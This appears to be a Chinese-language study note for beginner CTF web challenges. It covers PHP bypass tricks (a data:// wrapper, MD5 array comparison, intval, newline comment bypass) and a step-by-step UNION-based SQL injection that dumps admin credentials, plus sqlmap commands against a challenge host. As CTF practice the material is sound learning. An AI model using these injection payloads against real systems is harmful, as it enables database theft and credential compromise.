# WEEK1
## HTTP
![[Pasted image 20221012133653.png]]
![[Pasted image 20221012133711.png]]
![[Pasted image 20221012133805.png]]
![[Pasted image 20221012133822.png]]
![[Pasted image 20221012133905.png]]
![[Pasted image 20221012133932.png]]
## Head?Header!
![[Pasted image 20221012134149.png]]
![[Pasted image 20221012134158.png]]
![[Pasted image 20221012134206.png]]
![[Pasted image 20221012134212.png]]
![[Pasted image 20221012134223.png]]
![[Pasted image 20221012134239.png]]
![[Pasted image 20221012134249.png]]
## 我真的会谢
![[Pasted image 20221012134335.png]]
![[Pasted image 20221012135428.png]]
![[test.py]]

![[util.py]]
## NOT PHP
![[Pasted image 20221012135609.png]]
### file_get_contents()
"获取文件内容"
用到php伪协议
>https://blog.csdn.net/qq_45290991/article/details/113852174

`?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=`

### MD5校验绕过
>https://www.cnblogs.com/ainsliaea/p/15126218.html

`key1[]=1&key2[]=2`

### is_numeric()
判断是否为数字（有字母就不是数字）

### intval()
转换为整数

`2077abc`

### 井号 行注释
换行绕过（%0a）
![[Pasted image 20221012141857.png]]

## Word-For-You
![[Pasted image 20221014083400.png]]
测试命令是否能执行
![[Pasted image 20221014083814.png]]
1=2报错说明可以执行语句
![[Pasted image 20221014084019.png]]
测试union select
![[Pasted image 20221014084059.png]]
获取库名
![[Pasted image 20221014084143.png]]
获取表名
![[Pasted image 20221014084753.png]]
```sql
union select database(),TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database()#
```
>[! NOTE]+ 注意语法
>from 要写在所有 select 的位置的后面
>
>大小写关系不大

获取列名
```sql
union select column_name,NULL FROM information_schema.columns WHERE table_name='wfy_admin'#
```
![[Pasted image 20221014092923.png]]
获取数据
```sql
union select GROUP_CONCAT(Id,username,password,cookie),NULL FROM wfy_admin#
```
![[Pasted image 20221014093036.png]]

>[! DANGER]+ 注意
>没有报错，说明本来就没有内容

换一个表
```sql
union select column_name,NULL FROM information_schema.columns WHERE table_name='wfy_comments'#
```
![[Pasted image 20221014093310.png]]

获取数据
```sql
union select GROUP_CONCAT(id,text,user,name,display),NULL FROM wfy_comments#
```
![[Pasted image 20221014093424.png]]
## Word-For-You（使用sqlmap）
```bash
sqlmap -u "http://8b004110-6e60-48c4-b62f-56f970da8a1f.node4.buuoj.cn:81/comments.php" --data="name=1" --random-agent
```
或
```bash
sqlmap -r "post.txt"
```
